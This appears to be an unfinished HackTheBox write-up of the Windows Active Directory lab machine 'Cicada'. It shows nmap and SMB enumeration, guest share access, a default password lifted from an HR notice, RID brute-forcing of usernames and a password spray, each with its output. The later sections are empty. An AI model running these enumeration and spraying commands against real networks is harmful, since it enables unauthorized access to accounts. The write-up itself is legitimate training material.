---
title: "HackTheBox - Cicada"
date: 2025-10-02 15:42:59 -0700
categories: [ctf, htb, RedOps, writeup]
tags: [windows, easy, active directory, smb, ldap, dns, password spray]
---
# tl;dr
<details><summary>Spoilers</summary>
* enumerate SMB, get file from HR share to claim a password
* enumerate users either via SMB or LDAP
</details>

# Initial Intel
* Difficulty: Easy
* OS: Windows
* Active Directory

# Attack Path

## Recon

### Service Enumeration

Let's start off with a basic TCP scan. If we can't find anything we can later run a UDP scan.

```bash
# set host & initiate a standard tcp scan
export cicada=10.10.11.35
sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full $cicada
```

We see quite a few services. DNS, Kerberos, SMB, and LDAP tell us this is Active Directory and likely a Domain Controller.

```bash
# Services
53/tcp - domain - Simple DNS Plus
88/tcp - kerberos-sec - Microsoft Windows Kerberos
135/tcp - msrpc - Microsoft Windows RPC
139/tcp - netbios-ssn - Microsoft Windows netbios-ssn
389/tcp - ldap - Microsoft Windows Active Directory LDAP
445/tcp - microsoft-ds?
464/tcp - kpasswd5?
636/tcp - ssl/ldap - Microsoft Windows Active Directory LDAP
3268/tcp - ldap - Microsoft Windows Active Directory LDAP
3269/tcp - ssl/ldap - Microsoft Windows Active Directory LDAP
5985/tcp - http - Microsoft HTTPAPI httpd 2.0
```

#### SMB Enumeration

I like to start with SMB first as typically you can get a ton of information and may even get some files if you are lucky.

```bash
# enum4linux-ng is a great tool to run first to get a quick overview of the SMB setup
enum4linux-ng -A $cicada
.
.
.
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
.
.
.
[+] Found domain information via SMB
NetBIOS computer name: CICADA-DC
NetBIOS domain name: CICADA
DNS domain: cicada.htb
FQDN: CICADA-DC.cicada.htb
Derived membership: domain member
Derived domain: CICADA
.
.
.
```

We've confirmed the FQDN here. It's always good practice to add the hostname to our hosts file as soon as we can to continue recon.

I use a custom function **add-host**. Link to code here.

```bash
# add host to /etc/hosts
add-host $cicada CICADA-DC.cicada.htb

# confirm name resolution
ping cicada-dc.cicada.htb
```

Now we try to further enermate SMB by checking share access. **nxc** is one of my favorite tools and I highly recommend it for SMB enumeration, as well as other supported services.

```bash
# try guest access
nxc smb $cicada -u 'guest' -p '' -M spider_plus
.
.
.
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
```

Guest can read two shares. HR looks promising.

```bash
# try to download all files from the HR share
smbclient "//$cicada/HR" -N -c "prompt OFF;recurse ON;mget *"
.
.
.
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (3.4 KiloBytes/sec) (average 3.4 KiloBytes/sec)
```

There was a file 'Notice from HR.txt'. Let's check for intel.

```bash
cat 'Notice from HR.txt'
.
.
.
Your default password is: Cicada$M6Corpb*@Lp#nZp!8 
.
.
.
support@cicada.htb
.
.
.
```

Nice, we got a default password. We also got a support username. Let's try to get more usernames so we can try a password spray.

```bash
# Compile found passwords to passwords.txt
# Note the single quotes around the password. Using double quotes would require you to escape the special characters
echo 'Cicada$M6Corpb*@Lp#nZp!8' >> passwords.txt
```

```bash
# bruteforce usernames via RID & output to file users_rid.txt
nxc smb $cicada -u 'guest' -p '' --rid-brute | cut -d '\' -f 2 | cut -d " " -f 1 > users_rid.txt 
.
.
.
Enterprise
Group
Read-only
Cloneable
Protected
Key
Enterprise
RAS
Allowed
Denied
CICADA-DC$
DnsAdmins
DnsUpdateProxy
Groups
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
Dev
emily.oscars
```

Many users were returned, but it's best to focus on the accounts that look like they belong to a user. We'll focus on the accounts that have the firstname.lastname naming convention. We'll also add in the 'support' user we found earlier, too.

```bash
# we compile these into a users.txt file
vim users.txt

john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
support
```

Now the password spray:
```bash
# note: this command can also be ran with a single password:
# nxc smb $cicada -u users.txt 'Cicada$M6Corpb*@Lp#nZp!8'
# additionally, we could run the cmd without the --continue-on-success flag,
# however since this is a default password we want to see if any other account uses the password.
nxc smb $cicada -u users.txt -p passwords.txt --continue-on-success
.
.
.
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\support:Cicada$M6Corpb*@Lp#nZp!8 (Guest)

```

We get a successful login with user **michael.wrightson**, and a guest session with support. Let's try to access servics as michael:

```bash
nxc smb $cicada -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -M spider_plus
.
.
.
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 


```

## Foothold

## Lateral Movement

## Privilege Escalation

## Root / SYSTEM

# Lessons Learned

